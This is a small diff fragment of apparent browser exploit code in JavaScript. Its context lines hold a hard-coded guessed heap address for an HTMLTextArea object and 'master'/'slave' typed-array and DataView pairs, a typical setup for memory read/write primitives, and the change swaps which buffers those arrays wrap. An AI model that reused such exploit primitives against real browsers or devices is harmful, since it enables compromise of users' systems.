@@ -48,8 +48,8 @@ var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
 var shared_buf = new ArrayBuffer(0x1000);  
 
-var master_b = new Uint32Array(shared_buf);
-var slave_b =  new DataView(shared_buf);
+var master_b = new Uint32Array(new ArrayBuffer(1));
+var slave_b =  new DataView(new ArrayBuffer(1));
 
 //var master_b = new Uint32Array(new ArrayBuffer(8));
 //var slave_b =  new DataView(new ArrayBuffer(8));
